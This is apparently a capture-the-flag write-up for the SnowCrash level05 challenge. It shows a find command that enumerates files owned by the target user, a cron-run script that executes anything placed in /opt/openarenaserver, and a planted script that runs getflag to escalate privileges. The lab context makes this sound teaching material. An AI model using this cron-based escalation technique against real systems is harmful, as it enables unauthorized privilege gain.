# Writeup level05


The first message I get after login to ssh level05

![level05_start.png](https://cdn.discordapp.com/attachments/1164485225875783701/1173707145108267108/image.png?ex=6564eef5&is=655279f5&hm=1496f6ae70e4e93b77dd6bbb46e63d59a3e54dd47c6cb6a73e07b73ee52ce826&)

We can go to emails directly or search for files created by flag05

```
find / -user flag05 -exec ls -la {} \; 2>/dev/null
```

we have result :
```
level05@SnowCrash:~$ find / -user flag05 -exec ls -la {} \; 2>/dev/null
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
-rwxr-x--- 1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
```
we have read to this files 
let see the emails now and read files that crate by flag05:


![level05_start.png](https://cdn.discordapp.com/attachments/1164485225875783701/1173710786863042580/image.png?ex=6564f25a&is=65527d5a&hm=8ec668b4c50c42d25b9480ec22f08bdaf5f9c7878ef9141767ce6ebf42a4a7a0&)

we know now that every 2 minutes execute /usr/sbin/openarenaserver with flag05 user which mean our goal is to exploit openarenaserver and wait until the cron job runs.

openarenaserver:
```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
In this script we can see loop in opt/openarenaserver/ folder and than excute every file and the -x: This is an option or flag that stands for "xtrace" or "trace execution." When this option is used, Bash prints each command and its arguments to the standard error output before executing them.

our goal just  execute getflag command 
let test

```
#!/bin/sh

getflag > /tmp/ok.ok
```

![level05_exploit.png](https://cdn.discordapp.com/attachments/1164485225875783701/1173718202849689662/image.png?ex=6564f942&is=65528442&hm=733d461a4bfece3f4f32ec348df134c53f08136fe5d82e6ada9028e45fe23d8b&)




